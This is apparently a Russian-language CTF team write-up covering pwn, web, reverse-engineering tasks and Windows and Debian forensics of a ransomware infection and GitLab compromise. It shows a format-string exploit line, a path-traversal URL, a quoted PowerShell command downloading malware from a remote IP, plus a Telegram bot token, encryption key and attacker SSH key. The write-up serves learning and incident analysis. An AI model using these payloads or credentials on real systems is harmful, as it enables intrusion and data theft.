## Task-based

#### pwn 1
для получения флага нужно вызвать функцию `win`. мы можем вставлять в format string в `prinf` любую строку; используя эту уязвимость, перезаписываем адрес функции `exit`(которая вызывается в конце программы) на адрес функции `win` в GOT(Global Offset Table). таким образом, при вызове `exit` будет на самом деле вызываться `win`. используя возможности `pwntools`, эксплойт создаётся в одну строчку:
```python
payload = fmtstr_payload(6, {elf.got["exit"]: elf.symbols["win"]})
```

полный эксплойт: [expoit.py](pwn1/exploit.py)

флаг: `nto{easy_formt_string}`


#### pwn 2
данная программа полностью совпадает с заданием на [очень популярном учебнике по pwnу](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop). эксплойт полностью совпадает с предложенным автором учебника, только нужно заменить адрес строки `/bin/bash`(его можно найти используя `gdb`):
```python
BINSH = elf.address + 0x1430
```

для поиска `/bin/bash` в `gdb`:
```python
info proc mappings # берем адресс первого исполняемого блока
find <addr>, +0x1000, "/bin/bash"
```

полный эксплойт: [exploit.py](pwn2/exploit.py)

флаг: `nto{sropsropsroplazy}`


#### web 1
простейшая lfi. в коде страницы видим ссылку вида `http://192.168.12.10:5001/download?file_type=file1.txt`. как раз в `file1.txt` написано, что флаг в `/etc/secret`. делаем запрос `http://192.168.12.10:5001/download?file_type=../../../../../../etc/secret`

флаг: `nto{P6t9_T77v6RsA1}`


#### reverse 1
в программе есть массив с зашифрованным флагом. программа сравнивает зашифрованные пары символов флага с числами из массива. таким образом, можно зашифровать все возможные пары букв и вытащить флаг. мы это сделали написав скрипт на python, который использует скрипт на bash, который генерирует скрипт для gdb на каждую пару символов. в gdb просто ставится breakpoint на нужном месте и из регистра считаывается шифртекст. ~~да, интерпретатор, который использует интерпретатор, который использует интерпретатор, чтобы вытаскивать значения регистров.~~ далее, сохраняем все пары зашифрованные символы <-> сама биграмма и декодируем флаг.

генератор скрипта для gdb: [script.sh](reverse1/script.sh)
перебор и декодирование флага: [reverse1](reverse1/solve.py)

флаг: `nto{4n0TH3R_bRu73F0RC3_7ASk}`

## windows forensics
В логах `event viewer` можно найти примерно момент времени, в который была развернута малварь, с помощью данной команды `powershell`:
```powershell
powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);
(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); 
```
Видно, что команда скачивает файл `prikol.exe` в `c:\Users\\<наш пользователь>\AppData\Roaming\Rjomba.exe`
Примерно в то же время можно заметить какие-то события от `Outlook`, так что мы посмотрели его файлы. Посмотрев в типичное место для файлов `Outlook`, мы нашли файл `company_worker123@rambler.ru.ost` - незашифрованный файл с письмами пользователя. Проанализировав его, мы нашли письмо с вложением - `classic.rar`.  Впоследствии, в файле был найден вредоносный код, который эксплуатировал уязвимость, чтобы исполниться.

Был сделан дамп памяти - с помощью отладочного функционала `VirtualBox` сдампили физическиую память всей системы, далее с помощью `volatility3` достали оттуда дамп памяти процесса `Rjomba.exe`.  Команды для `volatility`:
```bash
python vol.py -f ~/Downloads/dump.dmp windows.pslist # узнать pid вируса
python vol.py -o . -f ~/Downloads/dump.dmp windows.memmap \
        --pid 4168 --dump # получить дамп памяти процесса вируса из дампа всей памяти
```

---

### 1. Каким образом вредоносное ПО попало на компьютер пользователя?
Пользователь открыл фишинговое письмо и распаковал архив, при распаковке которого запустилась команда выше
### 2. С какого сервера была скачана полезная нагрузка?
http://95.169.192.220:8080 - понятно из команды:
```powershell
powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);
(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); 
```
### 3. С помощью какой уязвимости данное ВПО запустилось? В каком ПО?
Вот, что было в архиве:
```
> unpacked
├── > 'TOP_SECRET.pdf '
└── # 'TOP_SECRET.pdf .cmd'
```
Этот архив эксплуатирует уязвимость `CVE-2023-38831` в `WinRar`, чтобы исполнить `.cmd` файл, в котором и была команда, найденная в логах.
### 4. Какие методы противодействия отладке использует программа?
Проанализировав используемые функции API windows и дкомпилированный код файла `Rjomba.exe` можно сделать следующие выводы:
-   Использует `IsDebuggerPresent` и `CheckRemoteDebuggerPresent` - встроенные функции библиотеки windows, которыя проверяют, отлаживается ли программа. Если программа отлаживается, файлы не шифруются, а процессы отладчиков убиваются с помощью `TerminateProcess`
-   Обфусцированные строчки
-   Проверяет, стоят ли в нем брейкпоинты
-   убивает все процессы, которые считает дебаггером. (`Taskmgr.exe`, `procexp.exe`, `procexp64a.exe`, `AnVir.exe`, `anvir64.exe`, `dumpcap.exe`, `ollydbg.exe`, `tcpview.exe`, `autoruns.exe`, `autorunsc.exe`, `filemon.exe`, `procmon.exe`, `regmon.exe`, `Wireshark.exe` и другие, нашли в дампе памяти)
### 5. Какой алгоритм шифрования используется при шифровании данных?
Посмотрев названия функций `prikol.exe` в `ghidra`, можно заметить названия вроде `CBC_Encryption`, что означает что алгоритм - `AES` в режиме `CBC`. Длина ключа - 256 бит, мы смогли понять это, так как шифровали тексты разных размеров и смотрели на длину итогового шифртекста.
### 6. Какой ключ шифрования используется при шифровании данных?
Далее с помощью `strings` и `grep -E` нашли все строки, длина которых совпадала с предполагаемой длиной ключа. Осмысленными из них были лишь две:
 
 - `amogusamogusamogusamogusamogusam`
 - `sugomasugomasugomasugomasugomasu`
Далее мы подошли к жюри и успешно сдали эти строчки.
### 7. Куда злоумышленник отсылает собранные данные? Каким образом  аутентифицируется на endpoint?
Поискав в дампе памяти системы можно было найти url - `https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE`  - значит, что злоумешленник отправлял данные боту в `telegram`, а аутентифицировался с помощью ключа `7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE`
### 8. Каково содержимое расшифрованного файла pass.txt на рабочем столе?
Так как `AES` использовался в режиме `CBC`, то чтобы расшифровать его, нам нужно было получить секретный initial vector. Поискав в дампе памяти и попробовав оттуда разные строки, было обнаружено что строка `abababababababab` выдавала пароль, который принимали жюри.

---

## Debian forensics

#### Вопрос 1
на сервере установлен GitLab Community Edition версии 15.2.2. можно узнать из `/opt/gitlab/LICENSE`

#### Вопрос 2
злоумышленник использовал RCE уязвимость в GitLab. это критическая [CVE-2022-2884](https://nvd.nist.gov/vuln/detail/CVE-2022-2884)

#### Вопрос 3
1. у пользователя `git`(из под которого запущен GitLab) есть право запускать `git` через `sudo` от `root` без пароля
2. на программе `/usr/bin/git` стоит SETUID бит. то есть, при запуске любым пользователем, `git` будет исполняться под `root`
3. разрешен вход по паролю под пользователем `root` по ssh. в `/etc/ssh/sshd_config`: `PermitRootLogin yes`

#### Вопрос 4
злоумышленник использовал первую мисконфигурацию из вопроса 3

#### Вопрос 5
злоумышленник добавил в доверенные для пользователя `root` ssh-ключи свой ключ:
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKXFjUp2LlKAsLvM1PZE7CYEfztiZrOf8PHx9ja1mu2 amongus@debian
```

#### Вопрос 6
злоумышленник использовал linpeas. В папке `/tmp` был файл `linpeas.txt`. из `/root/.bash_history` мы узнаем что этот файл был удален

#### Вопрос 7
злоумышленник использовал руткит [Jynx2](https://github.com/chokepoint/Jynx2)